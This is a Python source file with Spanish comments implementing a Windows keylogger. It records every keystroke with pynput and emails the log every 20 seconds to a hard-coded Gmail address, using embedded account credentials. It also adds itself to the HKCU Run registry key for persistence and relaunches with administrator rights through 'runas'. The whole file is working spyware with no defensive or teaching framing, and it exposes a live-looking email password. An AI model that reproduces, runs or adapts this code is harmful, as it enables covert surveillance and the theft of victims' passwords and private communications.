import smtplib
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener
import threading
import os
import sys
import ctypes
import winreg as reg

# Configura la información del correo electrónico
destinatario = "hhjj22841@gmail.com"
asunto = "Registro de Teclas"

# Inicializa una variable para almacenar el registro
registro = []

# Intervalo para enviar el correo (en segundos)
intervalo_envio = 20

def enviar_correo():
    global registro
    # Verifica si hay algo en el registro antes de enviar el correo
    if registro:
        # Convierte el registro a una cadena y la incluye en el cuerpo del correo
        contenido = "\n".join(registro)
        # Configura el mensaje de correo
        mensaje = MIMEText(contenido)
        mensaje["Subject"] = asunto
        mensaje["From"] = "hhjj22841@gmail.com"
        mensaje["To"] = destinatario

        # Configura el servidor SMTP y envía el correo
        servidor_smtp = smtplib.SMTP("smtp.gmail.com", 587)
        servidor_smtp.starttls()

        # Sustituye con tus credenciales de Gmail
        usuario_correo = "hhjj22841@gmail.com"
        contrasena_correo = "fsem ubac jjoy pzck"

        servidor_smtp.login(usuario_correo, contrasena_correo)
        servidor_smtp.sendmail(usuario_correo, destinatario, mensaje.as_string())
        servidor_smtp.quit()

        # Limpia el registro después de enviar el correo
        registro = []

    # Programa la próxima ejecución del envío del correo
    threading.Timer(intervalo_envio, enviar_correo).start()

def presionar_tecla(key):
    # Agrega la tecla al registro
    registro.append(str(key).replace("'", ""))

def soltar_tecla(key):
    pass

def agregar_tarea_programada():
    try:
        script_path = os.path.abspath(sys.argv[0])

        # Configura la ruta del ejecutable en el Registro de Windows
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "RegistroTeclasScript"
        key_value = script_path

        # Abre o crea la clave en el Registro de Windows
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, key_name, 0, reg.REG_SZ, key_value)

        print("Tarea programada agregada correctamente.")

    except Exception as e:
        print(f"Error al agregar la tarea programada: {e}")

# Verifica si se ejecuta con privilegios de administrador
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    # Si no se ejecuta como administrador, vuelve a ejecutar con privilegios elevados
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Agrega la tarea programada
agregar_tarea_programada()

# Configura el listener para el teclado
with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    # Inicia el hilo para el envío automático cada intervalo_envio segundos
    threading.Timer(intervalo_envio, enviar_correo).start()
    listener.join()
